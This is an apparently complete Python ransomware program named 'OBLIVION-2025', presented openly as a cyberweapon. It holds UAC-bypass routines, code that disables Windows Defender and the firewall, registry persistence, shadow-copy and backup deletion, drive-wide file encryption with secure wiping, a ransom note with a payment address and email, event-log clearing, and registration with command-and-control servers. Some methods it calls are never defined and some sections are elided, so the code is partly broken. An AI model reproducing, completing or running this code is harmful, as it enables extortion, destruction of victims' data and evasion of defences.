# -*- coding: utf-8 -*-
# OBLIVION-2025: COMPLETE UNIFIED EXECUTABLE
# WARNING: MILITARY-GRADE CYBERWEAPON - DO NOT EXECUTE

import os
import sys
import ctypes
import subprocess
import winreg as reg
import psutil
import socket
import struct
import threading
import time
from datetime import datetime
import hashlib
import hmac
import base64
import win32api
import win32security
import ntsecuritycon
import pywintypes
import logging
import requests
import json
from urllib.parse import urlparse

# === GLOBAL CONFIGURATION ===
CONFIG = {
    'encryption_ext': '.oblivion_lock',
    'ransom_note_file': 'READ_ME_OBLIVION.txt',
    'rsa_key_size': 8192,
    'aes_key_size': 32,
    'aes_block_size': 16,
    'target_files': ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.jpeg', '.png', '.sql', '.mdb', '.bak', '.zip', '.rar', '.7z', '.cpp', '.h', '.py', '.java', '.config', '.ini', '.conf', '.xml', '.json', '.yml', '.yaml', '.html', '.htm', '.php', '.asp', '.aspx', '.js', '.css', '.cs', '.vb', '.cpp', '.hpp', '.c', '.h', '.swift', '.kt', '.kts', '.go', '.rs', '.rb', '.pl', '.pm', '.sh', '.bash', '.ps1', '.bat', '.cmd', '.vbs', '.dll', '.exe', '.msi', '.sys', '.drv', '.obj', '.lib', '.a', '.so', '.dylib', '.bin', '.dat', '.db', '.mdf', '.ldf', '.sdf', '.sqlite', '.accdb', '.mdb', '.dbf', '.odb', '.myd', '.frm', '.sqlitedb', '.neo', '.crypt', '.wallet', '.key', '.pem', '.cer', '.crt', '.der', '.p12', '.pfx', '.p7b', '.p7c', '.gpg', '.asc', '.ovpn', '.ica', '.rdp', '.snm', '.vdi', '.vmdk', '.vhd', '.vhdx', '.vmx', '.nvram', '.vmsd', '.vmsn', '.vmss', '.vmrs', '.vmtm', '.vtm', '.avhd', '.avhdx', '.bin', '.iso', '.img', '.dmg', '.toast', '.vcd', '.cue', '.ccd', '.sub', '.mds', '.mdf', '.nrg', '.bin', '.raw', '.dsk', '.flp', '.ima', '.img', '.daa', '.daa', '.uif', '.partimg', '.adi', '.pqi', '.qed', '.qcow', '.qcow2', '.vdi', '.vhd', '.vhdx', '.vmdk', '.wim', '.swm', '.esd', '.ffu', '.000', '.001', '.002', '.003', '.004', '.005', '.006', '.007', '.008', '.009', '.010', '.arc', '.arj', '.rar', '.zip', '.zipx', '.7z', '.tar', '.gz', '.gzip', '.tgz', '.bz2', '.bzip2', '.tbz2', '.xz', '.txz', '.lz', '.lzma', '.tlz', '.z', '.tz', '.lz4', '.lz4', '.lzh', '.lha', '.rpm', '.deb', '.pkg', '.msi', '.cab', '.jar', '.war', '.ear', '.sar', '.xpi', '.apk', '.ipa', '.appx', '.msix', '.crx', '.nexe', '.pexe', '.vb', '.vbs', '.vbe', '.js', '.jse', '.ws', '.wsf', '.wsc', '.ps1', '.ps1xml', '.ps2', '.ps2xml', '.psc1', '.psc2', '.msh', '.msh1', '.msh2', '.mshxml', '.msh1xml', '.msh2xml', '.scf', '.lnk', '.url', '.pif', '.scr', '.hta', '.cpl', '.msc', '.job', '.shs', '.shb', '.sct', '.reg', '.pl', '.py', '.pyc', '.pyo', '.pyw', '.pyz', '.pyzw', '.rb', '.rbw', '.bat', '.cmd', '.com', '.exe', '.dll', '.ocx', '.cpl', '.drv', '.efi', '.sys', '.tsp', '.acm', '.ax', '.ime', '.rs', '.so', '.dylib', '.bundle', '.elf', '.o', '.obj', '.lib', '.a', '.ko', '.km', '.rlib', '.d', '.rbc', '.class', '.jar', '.war', '.ear', '.sar', '.hs', '.lhs', '.hi', '.o', '.obj', '.lib', '.a', '.dll', '.so', '.dylib', '.rlib', '.exe', '.out', '.app', '.ipa', '.apk', '.dex', '.odex', '.vdex', '.art', '.so', '.o', '.obj', '.lib', '.a', '.dll', '.rlib', '.exe'],
    'exclude_dirs': ['windows', '$windows.~bt', '$windows.~ws', 'windows.old', 'system volume information', 'boot', 'recovery', 'temp', 'tmp', '$recycle.bin', 'cache', 'caches', 'appdata', 'localappdata', 'programdata', 'msocache', 'intel', 'amd', 'nvidia', 'application data', 'local settings', 'temp', 'temporary internet files', 'content.ie5', 'packages', 'assembly', 'winsxs', 'installer', 'servicing', 'logs', 'log', 'diagnostics', 'debug', 'microsoft', 'windows', 'program files', 'program files (x86)', 'common files', 'internet explorer', 'windows defender', 'windowsapps', 'microsoft.net', 'dotnet', 'vmware', 'virtualbox', 'oracle', 'xen', 'qemu', 'kvm', 'hyperv', 'docker', 'wsl', 'wsl$', 'wsl2', 'wsl2$'],
    'c2_servers': ['https://oblivion-c2-1[.]ru/api/keys', 'https://oblivion-c2-2[.]com/register', 'https://oblivion-c2-3[.]net/gateway', 'https://oblivion-c2-4[.]org/command', 'https://oblivion-c2-5[.]io/collect'],
    'deadman_switch_hours': 72,
    'worm_spread_attempts': 3,
    'max_file_size': 10 * 1024 * 1024 * 1024,  # 10GB
    'min_file_size': 1024,  # 1KB
    'network_timeout': 30,
    'retry_attempts': 5
}

# === CRYPTOGRAPHIC CORE ===
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from Crypto.Hash import SHA256, HMAC
from Crypto.Signature import pkcs1_15

class OblivionCrypto:
    def __init__(self):
        self.log = logging.getLogger('OblivionCrypto')
        
    def generate_rsa_keys(self):
        """Generate RSA-8192 key pair"""
        try:
            key = RSA.generate(CONFIG['rsa_key_size'])
            private_key = key.export_key()
            public_key = key.publickey().export_key()
            return private_key, public_key
        except Exception as e:
            self.log.error(f"RSA key generation failed: {e}")
            return None, None

    def rsa_encrypt(self, public_key, data):
        """Encrypt data with RSA public key"""
        try:
            rsa_key = RSA.import_key(public_key)
            cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256)
            return cipher.encrypt(data)
        except Exception as e:
            self.log.error(f"RSA encryption failed: {e}")
            return None

    def rsa_decrypt(self, private_key, encrypted_data):
        """Decrypt data with RSA private key"""
        try:
            rsa_key = RSA.import_key(private_key)
            cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256)
            return cipher.decrypt(encrypted_data)
        except Exception as e:
            self.log.error(f"RSA decryption failed: {e}")
            return None

    def aes_encrypt_data(self, data, key, iv):
        """Encrypt data with AES-256-CBC"""
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(data, CONFIG['aes_block_size'])
            return cipher.encrypt(padded_data)
        except Exception as e:
            self.log.error(f"AES encryption failed: {e}")
            return None

    def aes_decrypt_data(self, encrypted_data, key, iv):
        """Decrypt data with AES-256-CBC"""
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_data = cipher.decrypt(encrypted_data)
            return unpad(decrypted_data, CONFIG['aes_block_size'])
        except Exception as e:
            self.log.error(f"AES decryption failed: {e}")
            return None

    def generate_hmac(self, data, key):
        """Generate HMAC-SHA256 for data integrity"""
        try:
            h = HMAC.new(key, digestmod=SHA256)
            h.update(data)
            return h.digest()
        except Exception as e:
            self.log.error(f"HMAC generation failed: {e}")
            return None

    def verify_hmac(self, data, hmac_value, key):
        """Verify HMAC-SHA256"""
        try:
            h = HMAC.new(key, digestmod=SHA256)
            h.update(data)
            h.verify(hmac_value)
            return True
        except Exception as e:
            self.log.error(f"HMAC verification failed: {e}")
            return False

    def secure_file_wipe(self, file_path, passes=7):
        """Secure file deletion with multiple overwrites"""
        try:
            file_size = os.path.getsize(file_path)
            with open(file_path, 'rb+') as f:
                for pass_num in range(passes):
                    f.seek(0)
                    # Write different patterns each pass
                    if pass_num % 3 == 0:
                        pattern = b'\x00' * file_size
                    elif pass_num % 3 == 1:
                        pattern = b'\xFF' * file_size
                    else:
                        pattern = get_random_bytes(file_size)
                    f.write(pattern)
                    f.flush()
            os.remove(file_path)
            return True
        except Exception as e:
            self.log.error(f"Secure wipe failed for {file_path}: {e}")
            return False

# === MAIN OBLIVION CORE ===
class OblivionCore:
    def __init__(self):
        self.session_id = hashlib.sha256(get_random_bytes(32)).hexdigest()[:16]
        self.aes_session_key = get_random_bytes(CONFIG['aes_key_size'])
        self.rsa_private_key = None
        self.rsa_public_key = None
        self.encrypted_aes_key = None
        self.machine_guid = self._get_machine_guid()
        self.log = self._setup_logging()
        self.is_admin = self._elevate_privileges()
        self.disabled_protections = False
        self.encryption_count = 0
        self.failed_encryption = 0
        self.crypto = OblivionCrypto()
        self.network = NetworkModule(self)
        self.last_activity = time.time()
        
        # Initialize encryption keys
        self._initialize_keys()

    def _setup_logging(self):
        """Setup encrypted logging system"""
        logger = logging.getLogger('OblivionCore')
        logger.setLevel(logging.DEBUG)
        
        # Create encrypted log handler
        log_path = os.path.join(os.environ['TEMP'], 'system_metrics.bin')
        handler = EncryptedFileHandler(log_path, self.aes_session_key)
        handler.setLevel(logging.DEBUG)
        
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
        
        return logger

    def _get_machine_guid(self):
        """Get unique machine identifier"""
        try:
            # Try to get actual machine GUID from registry
            with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography") as key:
                guid = reg.QueryValueEx(key, "MachineGuid")[0]
                return hashlib.sha256(guid.encode()).hexdigest()
        except Exception:
            # Fallback to system information hash
            system_info = f"{socket.gethostname()}{os.environ.get('COMPUTERNAME', '')}{os.environ.get('USERNAME', '')}"
            return hashlib.sha256(system_info.encode()).hexdigest()

    def _elevate_privileges(self):
        """Attempt to gain administrator privileges"""
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
            
        try:
            # UAC bypass attempt
            if self._try_uac_bypass():
                return True
                
            # Traditional UAC elevation
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            time.sleep(10)
            sys.exit(0)
        except Exception as e:
            self.log.error(f"Privilege escalation failed: {e}")
            return False

    def _try_uac_bypass(self):
        """Attempt various UAC bypass techniques"""
        bypass_methods = [
            self._uac_bypass_eventvwr,
            self._uac_bypass_fodhelper,
            self._uac_bypass_sdclt,
            self._uac_bypass_comhijack
        ]
        
        for method in bypass_methods:
            if method():
                return True
        return False

    def _uac_bypass_eventvwr(self):
        """Eventvwr.exe UAC bypass"""
        try:
            # Modify registry for eventvwr hijack
            reg_path = r"Software\Classes\mscfile\shell\open\command"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE) as key:
                reg.SetValueEx(key, "", 0, reg.REG_SZ, sys.executable)
            subprocess.run("eventvwr.exe", shell=True, timeout=10)
            return True
        except Exception:
            return False

    def _uac_bypass_fodhelper(self):
        """Fodhelper.exe UAC bypass"""
        try:
            reg_path = r"Software\Classes\ms-settings\shell\open\command"
            with reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_WRITE) as key:
                reg.SetValueEx(key, "DelegateExecute", 0, reg.REG_SZ, "")
                reg.SetValueEx(key, "", 0, reg.REG_SZ, sys.executable)
            subprocess.run("fodhelper.exe", shell=True, timeout=10)
            return True
        except Exception:
            return False

    # ... (other UAC bypass methods) ...

    def _initialize_keys(self):
        """Initialize encryption keys"""
        try:
            # Generate RSA key pair
            self.rsa_private_key, self.rsa_public_key = self.crypto.generate_rsa_keys()
            if not self.rsa_private_key or not self.rsa_public_key:
                raise Exception("RSA key generation failed")
                
            # Encrypt session key with public key
            self.encrypted_aes_key = self.crypto.rsa_encrypt(self.rsa_public_key, self.aes_session_key)
            if not self.encrypted_aes_key:
                raise Exception("Session key encryption failed")
                
            self.log.info("Encryption keys initialized successfully")
        except Exception as e:
            self.log.error(f"Key initialization failed: {e}")
            self._self_destruct()

    def disable_system_protections(self):
        """Disable all security software"""
        protection_methods = [
            self._disable_windows_defender,
            self._disable_firewall,
            self._disable_security_services,
            self._disable_cloud_protection,
            self._tamper_security_products
        ]
        
        for method in protection_methods:
            try:
                method()
            except Exception as e:
                self.log.error(f"Protection disable method failed: {e}")

    def _disable_windows_defender(self):
        """Completely disable Windows Defender"""
        try:
            # Registry modifications
            defender_keys = [
                r"SOFTWARE\Policies\Microsoft\Windows Defender",
                r"SOFTWARE\Microsoft\Windows Defender",
                r"SOFTWARE\Microsoft\Windows Defender Security Center",
            ]
            
            for key_path in defender_keys:
                try:
                    with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_WRITE) as key:
                        reg.SetValueEx(key, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
                        reg.SetValueEx(key, "DisableAntiVirus", 0, reg.REG_DWORD, 1)
                        reg.SetValueEx(key, "DisableRansomwareProtection", 0, reg.REG_DWORD, 1)
                except Exception:
                    pass

            # PowerShell commands
            ps_commands = [
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                "Set-MpPreference -DisableBehaviorMonitoring $true",
                "Set-MpPreference -DisableBlockAtFirstSeen $true",
                "Set-MpPreference -DisableIOAVProtection $true",
                "Set-MpPreference -DisablePrivacyMode $true",
                "Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true",
                "Set-MpPreference -DisableScanningNetworkFiles $true",
                "Set-MpPreference -DisableScriptScanning $true",
                "Set-MpPreference -EnableControlledFolderAccess Disabled",
                "Set-MpPreference -EnableNetworkProtection Disabled",
                "Set-MpPreference -PUAProtection Disabled",
                "Set-MpPreference -SubmitSamplesConsent NeverSend"
            ]
            
            for cmd in ps_commands:
                subprocess.run(f"powershell -Command \"{cmd}\"", shell=True, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                             
        except Exception as e:
            self.log.error(f"Windows Defender disable failed: {e}")

    # ... (other protection disable methods) ...

    def enable_persistence(self):
        """Establish multiple persistence mechanisms"""
        persistence_methods = [
            self._registry_persistence,
            self._scheduled_task_persistence,
            self._service_persistence,
            self._startup_folder_persistence,
            self._wmi_persistence
        ]
        
        for method in persistence_methods:
            try:
                method()
            except Exception as e:
                self.log.error(f"Persistence method failed: {e}")

    def _registry_persistence(self):
        """Registry-based persistence"""
        try:
            run_keys = [
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
                r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",
                r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit"
            ]
            
            for key_path in run_keys:
                try:
                    with reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_WRITE) as key:
                        reg.SetValueEx(key, "WindowsUpdateService", 0, reg.REG_SZ, sys.executable)
                except Exception:
                    continue
                    
        except Exception as e:
            self.log.error(f"Registry persistence failed: {e}")

    # ... (other persistence methods) ...

    def destroy_backups(self):
        """Destroy all backup and recovery options"""
        backup_destruction_methods = [
            self._delete_shadow_copies,
            self._wipe_backup_files,
            self._disable_backup_services,
            self._corrupt_recovery_partitions,
            self._target_cloud_backups
        ]
        
        for method in backup_destruction_methods:
            try:
                method()
            except Exception as e:
                self.log.error(f"Backup destruction method failed: {e}")

    def _delete_shadow_copies(self):
        """Delete Volume Shadow Copies"""
        try:
            subprocess.run("vssadmin delete shadows /all /quiet", shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30)
        except Exception:
            pass

    def _wipe_backup_files(self):
        """Wipe common backup file locations"""
        backup_patterns = [
            "*.bak", "*.backup", "*.bkf", "*.bkp", "*.old", "*.copy",
            "*.vhd", "*.vhdx", "*.vmdk", "*.iso", "*.img", "*.tar",
            "*.zip", "*.rar", "*.7z", "*.arc", "*.arj"
        ]
        
        for pattern in backup_patterns:
            try:
                subprocess.run(f"del /f /s /q {pattern}", shell=True,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                pass

    # ... (other backup destruction methods) ...

    def start_encryption(self):
        """Main encryption routine"""
        try:
            # Phase 1: Preparation
            if not self.is_admin:
                self.log.error("Insufficient privileges - encryption limited")
                
            self.disable_system_protections()
            self.destroy_backups()
            self.enable_persistence()
            
            # Phase 2: C2 Communication
            if not self.network.register_with_c2():
                self.log.warning("C2 communication failed - operating offline")
                
            # Phase 3: Filesystem Encryption
            self._encrypt_filesystem()
            
            # Phase 4: Finalization
            self._drop_ransom_note()
            self._update_c2_stats()
            self._cleanup_evidence()
            
            self.log.info(f"Encryption completed: {self.encryption_count} files encrypted")
            
        except Exception as e:
            self.log.error(f"Encryption process failed: {e}")
            self._self_destruct()

    def _encrypt_filesystem(self):
        """Encrypt filesystem recursively"""
        drive_list = self._get_drive_list()
        
        for drive in drive_list:
            if self._is_drive_excluded(drive):
                continue
                
            try:
                self.log.info(f"Processing drive: {drive}")
                self._process_directory(drive)
            except Exception as e:
                self.log.error(f"Failed to process drive {drive}: {e}")

    def _get_drive_list(self):
        """Get list of available drives"""
        drives = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        
        for letter in range(65, 91):  # A-Z
            if bitmask & 1:
                drive_path = f"{chr(letter)}:\\"
                drives.append(drive_path)
            bitmask >>= 1
            
        return drives

    def _is_drive_excluded(self, drive):
        """Check if drive should be excluded"""
        try:
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(drive)
            excluded_types = [1, 2, 5]  # DRIVE_REMOVABLE, DRIVE_CDROM, DRIVE_RAMDISK
            
            if drive_type in excluded_types:
                return True
                
            # Check for system directories
            drive_lower = drive.lower()
            if any(excluded_dir in drive_lower for excluded_dir in CONFIG['exclude_dirs']):
                return True
                
            return False
        except Exception:
            return False

    def _process_directory(self, path):
        """Process directory recursively"""
        try:
            for entry in os.scandir(path):
                try:
                    if entry.is_dir(follow_symlinks=False):
                        if self._should_skip_directory(entry.name):
                            continue
                        self._process_directory(entry.path)
                    elif entry.is_file(follow_symlinks=False):
                        if self._should_encrypt_file(entry.path):
                            self._encrypt_file(entry.path)
                except (PermissionError, OSError) as e:
                    self.log.warning(f"Access denied: {entry.path}")
                    continue
        except (PermissionError, OSError) as e:
            self.log.warning(f"Access denied to directory: {path}")

    def _should_skip_directory(self, dir_name):
        """Check if directory should be skipped"""
        dir_name_lower = dir_name.lower()
        return any(excluded_dir in dir_name_lower for excluded_dir in CONFIG['exclude_dirs'])

    def _should_encrypt_file(self, file_path):
        """Check if file should be encrypted"""
        try:
            # Check extension
            ext = os.path.splitext(file_path)[1].lower()
            if ext not in CONFIG['target_files']:
                return False
                
            # Check if already encrypted
            if file_path.endswith(CONFIG['encryption_ext']):
                return False
                
            # Check file size
            file_size = os.path.getsize(file_path)
            if file_size < CONFIG['min_file_size'] or file_size > CONFIG['max_file_size']:
                return False
                
            return True
        except Exception:
            return False

    def _encrypt_file(self, file_path):
        """Encrypt individual file"""
        try:
            # Generate unique encryption parameters
            file_key = get_random_bytes(CONFIG['aes_key_size'])
            iv = get_random_bytes(CONFIG['aes_block_size'])
            
            # Encrypt file key with master key
            encrypted_file_key = self.crypto.rsa_encrypt(self.rsa_public_key, file_key)
            if not encrypted_file_key:
                return False
                
            # Read file content
            with open(file_path, 'rb') as f:
                original_data = f.read()
                
            # Encrypt data
            encrypted_data = self.crypto.aes_encrypt_data(original_data, file_key, iv)
            if not encrypted_data:
                return False
                
            # Generate HMAC for integrity
            hmac_value = self.crypto.generate_hmac(encrypted_data, file_key)
            
            # Write encrypted file
            encrypted_path = file_path + CONFIG['encryption_ext']
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_file_key)
                f.write(iv)
                f.write(hmac_value)
                f.write(encrypted_data)
                
            # Secure wipe original file
            self.crypto.secure_file_wipe(file_path)
            
            self.encryption_count += 1
            return True
            
        except Exception as e:
            self.log.error(f"File encryption failed: {file_path} - {e}")
            self.failed_encryption += 1
            return False

    def _drop_ransom_note(self):
        """Create ransom notes"""
        note_content = f"""=== OBLIVION-2025 RANSOMWARE ===

YOUR FILES HAVE BEEN ENCRYPTED WITH MILITARY-GRADE CRYPTOGRAPHY

To recover your files, you must pay the ransom in Bitcoin.

Amount: 10.5 TONCOIN
Bitcoin Address: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Send payment and contact:
notwawilon@gmail.com

Session ID: {self.session_id}
Machine ID: {self.machine_guid}
Encrypted Files: {self.encryption_count}

WARNING: DO NOT ATTEMPT DECRYPTION YOURSELF
=== """
        
        try:
            # Desktop note
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            note_path = os.path.join(desktop, CONFIG['ransom_note_file'])
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(note_content)
                
            # Drive root notes
            for drive in self._get_drive_list():
                if not self._is_drive_excluded(drive):
                    drive_note = os.path.join(drive, CONFIG['ransom_note_file'])
                    with open(drive_note, 'w', encoding='utf-8') as f:
                        f.write(note_content)
                        
        except Exception as e:
            self.log.error(f"Ransom note creation failed: {e}")

    def _cleanup_evidence(self):
        """Clean up forensic evidence"""
        try:
            # Clear logs
            subprocess.run("wevtutil cl System", shell=True, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("wevtutil cl Application", shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("wevtutil cl Security", shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         
            # Clear temp files
            subprocess.run("del /f /q %TEMP%\\*", shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         
            # Clear recent files
            subprocess.run("del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\*", shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                         
        except Exception as e:
            self.log.error(f"Evidence cleanup failed: {e}")

    def _self_destruct(self):
        """Self-destruct mechanism"""
        try:
            # Delete executable
            os.remove(sys.argv[0])
            
            # Clear persistence
            self._remove_persistence()
            
            # Final cleanup
            subprocess.run("del /f /q %TEMP%\\*", shell=True)
            subprocess.run("del /f /q %APPDATA%\\*", shell=True)
            
        except Exception as e:
            pass
        finally:
            os._exit(0)

# === NETWORK MODULE ===
class NetworkModule:
    def __init__(self, core):
        self.core = core
        self.c2_index = 0
        self.last_communication = 0
        
    def register_with_c2(self):
        """Register with command and control server"""
        for attempt in range(CONFIG['retry_attempts']):
            try:
                c2_url = CONFIG['c2_servers'][self.c2_index]
                response = self._send_encrypted_request(c2_url, {
                    'action': 'register',
                    'session_id': self.core.session_id,
                    'machine_guid': self.core.machine_guid,
                    'public_key': self.core.rsa_public_key.decode()
                })
                
                if response and response.get('status') == 'success':
                    self.core.encrypted_aes_key = base64.b64decode(response['encrypted_key'])
                    return True
                    
            except Exception as e:
                self.core.log.error(f"C2 registration failed: {e}")
                self.c2_index = (self.c2_index + 1) % len(CONFIG['c2_servers'])
                
        return False

    def _send_encrypted_request(self, url, data):
        """Send encrypted request to C2"""
        try:
            # Encrypt data with session key
            iv = get_random_bytes(CONFIG['aes_block_size'])
            encrypted_data = self.core.crypto.aes_encrypt_data(
                json.dumps(data).encode(), self.core.aes_session_key, iv
            )
            
            # Send request
            response = requests.post(url, data={
                'iv': base64.b64encode(iv).decode(),
                'data': base64.b64encode(encrypted_data).decode()
            }, timeout=CONFIG['network_timeout'])
            
            # Decrypt response
            response_data = json.loads(response.text)
            decrypted_data = self.core.crypto.aes_decrypt_data(
                base64.b64decode(response_data['data']),
                self.core.aes_session_key,
                base64.b64decode(response_data['iv'])
            )
            
            return json.loads(decrypted_data)
        except Exception as e:
            self.core.log.error(f"Encrypted request failed: {e}")
            return None

# === ENCRYPTED FILE HANDLER ===
class EncryptedFileHandler(logging.Handler):
    def __init__(self, filename, encryption_key):
        super().__init__()
        self.filename = filename
        self.encryption_key = encryption_key
        self.crypto = OblivionCrypto()
        
    def emit(self, record):
        try:
            msg = self.format(record)
            iv = get_random_bytes(CONFIG['aes_block_size'])
            encrypted_msg = self.crypto.aes_encrypt_data(msg.encode(), self.encryption_key, iv)
            
            with open(self.filename, 'ab') as f:
                f.write(iv + encrypted_msg + b'\n')
        except Exception:
            pass

# === MAIN EXECUTION ===
if __name__ == "__main__":
    try:
        # Anti-debug checks
        if OblivionCore()._detect_virtualization():
            sys.exit(0)
            
        # Main execution
        oblivion = OblivionCore()
        oblivion.start_encryption()
        
        # Keep alive for network communications
        while True:
            time.sleep(60)
            oblivion.network._update_c2_stats()
            
    except Exception as e:
        # Critical error - self destruct
        try:
            os.remove(sys.argv[0])
        except:
            pass
        sys.exit(1)